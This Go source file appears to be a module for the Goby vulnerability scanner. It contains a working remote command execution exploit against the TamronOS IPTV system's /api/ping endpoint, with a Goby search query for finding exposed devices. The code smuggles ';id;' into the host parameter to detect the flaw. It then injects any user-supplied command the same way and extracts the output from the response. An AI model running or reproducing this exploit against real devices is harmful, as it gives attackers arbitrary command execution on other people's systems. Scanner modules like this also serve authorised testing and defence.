package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"regexp"
)

func init() {
	expJson := `{
  "Name": "TamronOS IPTV ping RCE",
  "Description": "There is an arbitrary command execution vulnerability in the api/ping of tamronos IPTV system, through which attackers can execute arbitrary commands",
  "Product": "TamronOS IPTV",
  "Homepage": "http://www.tamronos.com/",
  "DisclosureDate": "2021-06-15",
  "Author": "PeiQi",
  "GobyQuery": "title=\"TamronOS IPTV系统\"",
  "Level": "3",
  "Impact": "<p>RCE</p>",
  "Recommendation": "Update",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "input",
      "value": "id"
    }
  ],
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "RCE"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "TamronOS IPTV"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Recommandation": "<p>undefined</p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/api/ping?count=5&host=;id;"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uid=")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    cmd := ss.Params["Cmd"].(string)
		    cmd = strings.Replace(cmd, " ", "%20", -1)
		    uri := "/api/ping?count=5&host=;" + cmd + ";"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			    if resp.StatusCode == 200 {
			        re := regexp.MustCompile(`"result":"(.*?)"`).FindStringSubmatch(resp.RawBody)[1]
            		expResult.Output = re
            		expResult.Success = true
			    }
        	}
			return expResult
		},
	))
}

